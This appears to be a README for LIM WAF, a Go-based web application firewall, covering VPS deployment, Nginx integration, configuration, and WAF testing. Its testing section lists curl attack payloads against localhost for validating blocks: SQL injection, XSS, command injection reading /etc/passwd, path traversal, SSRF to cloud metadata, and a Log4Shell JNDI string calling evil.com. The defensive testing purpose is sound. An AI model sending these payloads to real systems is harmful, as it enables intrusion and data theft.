# 🛡️ LIM WAF

**LIM WAF** is a lightweight, custom-branded Web Application Firewall (WAF) and high-performance reverse proxy powered by Go (Coraza Engine v3.7.0) with full **OWASP Core Rule Set (CRS) v4** compatibility.

Instead of installing a complex raw WAF engine, LIM WAF is packaged as a single static binary specifically designed for VPS installations. It features custom-branded error pages ("**Secured by LIM**"), search engine crawler whitelisting, and an embedded real-time admin dashboard.

---

## 📑 Table of Contents

1. [Features](#features)
2. [Architecture Topology](#architecture-topology)
3. [Step-by-Step Deployment Guide](#step-by-step-deployment-guide)
   - [Step 1: Build Binary Locally](#step-1-build-binary-locally)
   - [Step 2: Upload Files to VPS](#step-2-upload-files-to-vps)
   - [Step 3: Run the Automated Installer](#step-3-run-the-automated-installer)
   - [Step 4: Configure Sites & WAF Engine](#step-4-configure-sites--waf-engine)
   - [Step 5: Nginx SSL Termination Integration](#step-5-nginx-ssl-termination-integration)
   - [Step 6: Service Management](#step-6-service-management)
   - [Step 7: Accessing the Admin Dashboard](#step-7-accessing-the-admin-dashboard)
4. [Updating LIM WAF](#updating-lim-waf)
5. [Configuration Reference](#configuration-reference)
6. [Security Validation & Testing Guide](#security-validation--testing-guide)
   - [Automated Security Testing](#automated-security-testing)
   - [Load & Stress Testing](#load--stress-testing)
   - [Manual Attack Vectors Testing](#manual-attack-vectors-testing)
   - [Audit Log Analysis](#audit-log-analysis)
   - [Remediation & Paranoia Tuning](#remediation--paranoia-tuning)
7. [CI/CD Integration](#cicd-integration)
8. [Development](#development)

---

## Features

- **High-Performance Go Engine**: Built on Coraza v3.7.0, executed in Go for ultra-low latency.
- **OWASP CRS v4 Ready**: Out-of-the-box defense against SQLi, XSS, RCE, LFI, SSRF, Java/Log4Shell, PHP attacks, and protocol violations.
- **Search Engine Bot Whitelisting**: Built-in support for Googlebot, Bingbot, Slurp, DuckDuckBot, Baidu, and Yandex crawlers (with optional FCrDNS reverse-DNS verification).
- **Custom Branding**: Branded "403 Access Denied" block pages linked to `https://nuralim.dev`.
- **Embedded Admin Dashboard**: Real-time stats, threat logs, live config editor, and instant rule hot-reloading on port `:9443`.
- **Multi-Domain Reverse Proxy**: Protect multiple domains with domain-based routing from a single binary.

---

## Architecture Topology

```
[ Internet Traffic ]
        │
        ▼
┌─────────────────────────┐
│ Nginx / Front LoadBalancer│ (TLS Termination: Port 443)
└───────────┬─────────────┘
            │ proxy_pass http://127.0.0.1:8081
            ▼
┌─────────────────────────┐
│ LIM WAF Reverse Proxy   │ (Port :8081 or :80)
│ (Coraza WAF + CRS v4)   │
└───────────┬─────────────┘
            │ Safe Traffic
            ▼
┌─────────────────────────┐
│ Upstream Backend Apps   │ (e.g., Node.js :3000, Go :8080)
└─────────────────────────┘
```

---

## Step-by-Step Deployment Guide

Follow this guide to deploy LIM WAF on your production Linux VPS.

### Step 1: Build Binary Locally
Since LIM WAF compiles into a single static binary, you do not need Go installed on your production VPS.

From your local machine, cross-compile the binary for Linux AMD64:

```powershell
# Windows PowerShell:
$env:GOOS="linux"; $env:GOARCH="amd64"; go build -o build/lim-waf ./cmd/lim-waf

# Mac / Linux Bash:
GOOS=linux GOARCH=amd64 go build -o build/lim-waf ./cmd/lim-waf
```

---

### Step 2: Upload Files to VPS
Prepare the installer directory on your VPS and upload the compiled binary and scripts:

```bash
# On your VPS, create the installer directory:
sudo mkdir -p /opt/lim-waf-installer/build
sudo chown -R $USER:$USER /opt/lim-waf-installer

# On your local machine, SCP the build binary and scripts folder:
# Default Port 22:
scp build/lim-waf root@YOUR_VPS_IP:/opt/lim-waf-installer/build/lim-waf
scp -r scripts root@YOUR_VPS_IP:/opt/lim-waf-installer/

# If using Custom SSH Port (e.g., Port 2222 - Note capital -P):
scp -P 2222 build/lim-waf root@YOUR_VPS_IP:/opt/lim-waf-installer/build/lim-waf
scp -P 2222 -r scripts root@YOUR_VPS_IP:/opt/lim-waf-installer/
```

---

### Step 3: Run the Automated Installer
SSH into your VPS and run the installer script (use `-p <port>` if custom SSH port):

```bash
# Default Port 22:
ssh root@YOUR_VPS_IP

# Custom Port (e.g., Port 2222 - Note lowercase -p):
ssh -p 2222 root@YOUR_VPS_IP
cd /opt/lim-waf-installer
chmod +x scripts/install.sh
sudo ./scripts/install.sh
```

**What the installer does automatically:**
1. Installs the binary to `/usr/local/bin/lim-waf`
2. Downloads and configures the latest **OWASP Core Rule Set (CRS) v4** into `/etc/lim-waf/rules/coreruleset`
3. Sets up custom rules directory at `/etc/lim-waf/rules/custom`
4. Creates log directory at `/var/log/lim-waf`
5. Configures systemd unit at `/etc/systemd/system/lim-waf.service`

---

### Step 4: Configure Sites & WAF Engine
Edit `/etc/lim-waf/config.yaml` on your VPS to define your domains and backends:

```yaml
server:
  listen: ":8081" # Internal WAF listening port

sites:
  - domain: "example.com"
    backend: "http://127.0.0.1:3000"
    waf:
      enabled: true
      mode: "on" # Options: "on", "detection_only", "off"

  - domain: "api.example.com"
    backend: "http://127.0.0.1:8080"
    waf:
      enabled: true
      mode: "on"

rules:
  crs_path: "/etc/lim-waf/rules/coreruleset"
  custom_rules_path: "/etc/lim-waf/rules/custom"

logging:
  level: "info"
  file: "/var/log/lim-waf/access.log"
  audit_log: "/var/log/lim-waf/audit.log"

branding:
  name: "LIM"
  url: "https://nuralim.dev"

bot_detection:
  enabled: true
  honeypot_paths:
    - /wp-login.php
    - /.env
    - /.git/config
  allowed_bots:
    - googlebot
    - bingbot
    - slurp
    - duckduckbot
    - baiduspider
    - yandexbot
  verify_bots_by_dns: false # Perform FCrDNS lookup to prevent User-Agent spoofing

dashboard:
  enabled: true
  listen: "127.0.0.1:9443"
  basic_auth:
    username: "admin"
    password: "your_secure_password" # Plaintext will auto-hash to bcrypt on first start
```

---

### Step 5: Nginx SSL Termination Integration
If Nginx handles HTTPS on port 443, update your Nginx server block to route traffic through LIM WAF (port 8081) instead of directly to your backend:

```nginx
server {
    listen 443 ssl http2;
    server_name example.com www.example.com;

    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:8081; # Pass traffic to LIM WAF
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Reload Nginx:
```bash
sudo nginx -t && sudo systemctl reload nginx
```

---

### Step 6: Service Management
Manage LIM WAF via systemd:

```bash
# Start service
sudo systemctl start lim-waf

# Enable autostart on boot
sudo systemctl enable lim-waf

# Check service status
sudo systemctl status lim-waf

# View live service logs
sudo journalctl -u lim-waf -f
```

---

### Step 7: Accessing the Admin Dashboard
The Admin Dashboard runs securely on port `9443`. Access it via SSH Tunneling:

```bash
# Default Port 22:
ssh -L 9443:127.0.0.1:9443 root@YOUR_VPS_IP

# Custom SSH Port (e.g., Port 2222):
ssh -p 2222 -L 9443:127.0.0.1:9443 root@YOUR_VPS_IP
```

Open `http://127.0.0.1:9443` in your web browser and log in with your dashboard credentials.

---

## Updating & Verifying LIM WAF

### Checking Existing Installation on VPS
If LIM WAF is already installed on your server, you can verify its status and paths using these commands:

```bash
# 1. Verify binary location and version
which lim-waf           # Should return /usr/local/bin/lim-waf
lim-waf version         # Displays installed version

# 2. Check systemd service status
sudo systemctl status lim-waf

# 3. Inspect configuration file & rule directory
ls -la /etc/lim-waf/
cat /etc/lim-waf/config.yaml

# 4. Check active listening ports
sudo ss -tulpn | grep lim-waf

# 5. Check live application logs
tail -f /var/log/lim-waf/service.log
```

---

### Updating LIM WAF to a New Version
If LIM WAF is already installed and running, you **do not** need to re-run the `/opt` installer. Simply build locally and replace the binary:

1. **Build locally**:
   ```bash
   GOOS=linux GOARCH=amd64 go build -o build/lim-waf ./cmd/lim-waf
   ```
2. **Upload binary directly to installation path**:
   ```bash
   # Default Port 22:
   scp build/lim-waf nuralim@YOUR_VPS_IP:~/lim-waf-new

   # Custom SSH Port (e.g., Port 2222 - Note capital -P):
   scp -P 2222 build/lim-waf nuralim@YOUR_VPS_IP:~/lim-waf-new
   ```
3. **Move & Restart Service**:
   ```bash
   # Default Port 22:
   ssh nuralim@YOUR_VPS_IP "sudo mv ~/lim-waf-new /usr/local/bin/lim-waf && sudo chmod +x /usr/local/bin/lim-waf && sudo systemctl restart lim-waf"

   # Custom SSH Port (e.g., Port 2222 - Note lowercase -p):
   ssh -p 2222 nuralim@YOUR_VPS_IP "sudo mv ~/lim-waf-new /usr/local/bin/lim-waf && sudo chmod +x /usr/local/bin/lim-waf && sudo systemctl restart lim-waf"
   ```

*(Your existing configurations in `/etc/lim-waf/config.yaml` and rules in `/etc/lim-waf/rules/` remain preserved).*

---

## Configuration Reference

| Field | Description | Default |
|---|---|---|
| `server.listen` | Address & port WAF listens on | `:80` |
| `sites[].domain` | Domain host to protect | — |
| `sites[].backend` | Backend target URL | — |
| `sites[].waf.mode` | `on`, `detection_only`, or `off` | `on` |
| `rules.crs_path` | Directory containing OWASP CRS v4 | `/etc/lim-waf/rules/coreruleset` |
| `rules.custom_rules_path` | Directory for custom `.conf` rules | `/etc/lim-waf/rules/custom` |
| `rate_limit.requests_per_minute` | Global requests per minute limit | `300` |
| `ip_reputation.whitelist` | CIDR blocks to bypass WAF | `[]` |
| `ip_reputation.blacklist` | CIDR blocks to block completely | `[]` |
| `bot_detection.allowed_bots` | Search crawler User-Agent keywords | `[googlebot, bingbot, ...]` |
| `bot_detection.verify_bots_by_dns` | Perform FCrDNS reverse lookup to prevent UA spoofing | `false` |
| `request_validation.max_body_size` | Maximum allowed request payload | `10MB` |
| `request_validation.response_body_limit` | Maximum response size inspected | `512KB` |

---

## Security Validation & Testing Guide

### Automated Security Testing

LIM WAF includes automated test suites to validate attack blocking performance.

| Platform | Script | Tool |
|---|---|---|
| Linux / Mac / WSL | `scripts/waf-test.sh` | Bash + `curl` |
| Windows | `scripts/waf-test.ps1` | PowerShell |

**Running Bash Test:**
```bash
chmod +x scripts/waf-test.sh
./scripts/waf-test.sh http://localhost:8081
```

**Running PowerShell Test:**
```powershell
.\scripts\waf-test.ps1 -Target "http://localhost:8081"
```

---

### Load & Stress Testing

Validate WAF performance under high load using the load testing scripts:

```powershell
# PowerShell
.\scripts\load-test.ps1 -Target "http://localhost:8081" -Concurrent 50 -Duration 60
```

```bash
# Bash
./scripts/load-test.sh -t "http://localhost:8081" -c 50 -d 60
```

---

### Manual Attack Vectors Testing

Test specific security rules using `curl`:

#### 1. SQL Injection (CRS 942xxx)
```bash
# Classic OR-based SQLi
curl -v "http://localhost:8081/?id=1' OR '1'='1"

# UNION SELECT attack
curl -v "http://localhost:8081/?id=1 UNION SELECT username,password FROM users--"

# Stacked query
curl -v "http://localhost:8081/?id=1;DROP TABLE users--"
```

#### 2. Cross-Site Scripting / XSS (CRS 941xxx)
```bash
# Reflected XSS
curl -v "http://localhost:8081/?q=<script>alert('XSS')</script>"

# Image onerror payload
curl -v "http://localhost:8081/?q=<img src=x onerror=alert(1)>"
```

#### 3. Command Injection / RCE (CRS 932xxx)
```bash
# Linux RCE
curl -v "http://localhost:8081/?cmd=;cat /etc/passwd"

# Subshell RCE
curl -v 'http://localhost:8081/?name=$(whoami)'
```

#### 4. Path Traversal / LFI (CRS 930xxx)
```bash
# Directory traversal
curl -v "http://localhost:8081/?file=../../../../etc/passwd"

# Sensitive file probing
curl -v "http://localhost:8081/.env"
```

#### 5. SSRF (CRS 934xxx)
```bash
# AWS Metadata Endpoint (Crucial check)
curl -v "http://localhost:8081/?url=http://169.254.169.254/latest/meta-data/"
```

#### 6. Java / Log4Shell (CRS 944xxx)
```bash
# Log4j JNDI injection (CVE-2021-44228)
curl -v "http://localhost:8081/" -H 'X-Api-Version: ${jndi:ldap://evil.com/a}'
```

#### 7. Scanner / Bot Probes (CRS 913xxx)
```bash
# sqlmap probe
curl -v "http://localhost:8081/" -H "User-Agent: sqlmap/1.4"
```

> **Expected Outcome**: All attack requests must return **HTTP 403 Forbidden** displaying the custom "Secured by LIM" block page.

---

### Audit Log Analysis

Check detailed security logs on your VPS:

```bash
# View live audit logs
tail -f /var/log/lim-waf/audit.log

# Filter for blocked 403 requests
grep "403" /var/log/lim-waf/audit.log

# Search by specific CRS Rule ID (e.g., 942100 for SQLi)
grep "942100" /var/log/lim-waf/audit.log
```

---

### Remediation & Paranoia Tuning

To adjust rule sensitivity, modify `/etc/lim-waf/rules/coreruleset/crs-setup.conf`:

```conf
# Set Paranoia Level (1 = Standard, 2 = Aggressive, 3-4 = Maximum)
SecAction \
    "id:900000,\
     phase:1,\
     nolog,\
     pass,\
     t:none,\
     setvar:tx.blocking_paranoia_level=2"
```

Apply rule changes dynamically without dropping connections:
```bash
curl -X POST http://127.0.0.1:9443/api/rules/reload
```

---

## CI/CD Integration

Automate WAF security validation in GitHub Actions `.github/workflows/waf-test.yml`:

```yaml
name: WAF Security Test
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  waf-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.25'

      - name: Build LIM WAF
        run: go build -o build/lim-waf ./cmd/lim-waf

      - name: Run WAF Security Tests
        run: |
          python3 -m http.server 8080 &
          ./build/lim-waf serve --config testenv/config.yaml &
          sleep 3
          chmod +x scripts/waf-test.sh
          ./scripts/waf-test.sh http://localhost:8081
```

---

## Development

Build locally using `Makefile`:

```bash
# Standard local build
make build

# Build Linux release binary
make release
```

---

*Secured by [LIM](https://nuralim.dev)*
